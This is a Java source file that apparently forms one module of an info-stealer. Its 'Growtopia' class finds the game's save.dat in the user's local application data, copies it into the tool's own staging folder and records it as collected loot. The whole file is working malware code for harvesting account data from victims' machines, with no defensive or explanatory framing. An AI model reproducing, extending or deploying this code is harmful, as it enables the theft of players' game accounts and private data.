package itzgonza.hollyshit.impl.game;

import java.io.File;

import org.apache.commons.io.FileUtils;

import itzgonza.hollyshit.utils.utilities;

public class Growtopia extends utilities {

    public void initialize() throws Exception {
        File saveFile = new File(System.getenv("LOCALAPPDATA") + "/Growtopia/save.dat");
        if (saveFile.exists()) {
            File destFile = new File(getFolder() + "/game/growtopia/save.dat");
            destFile.getParentFile().mkdirs();
            FileUtils.copyFile(saveFile, destFile);
            content.add("growtopia");
        }
    }
}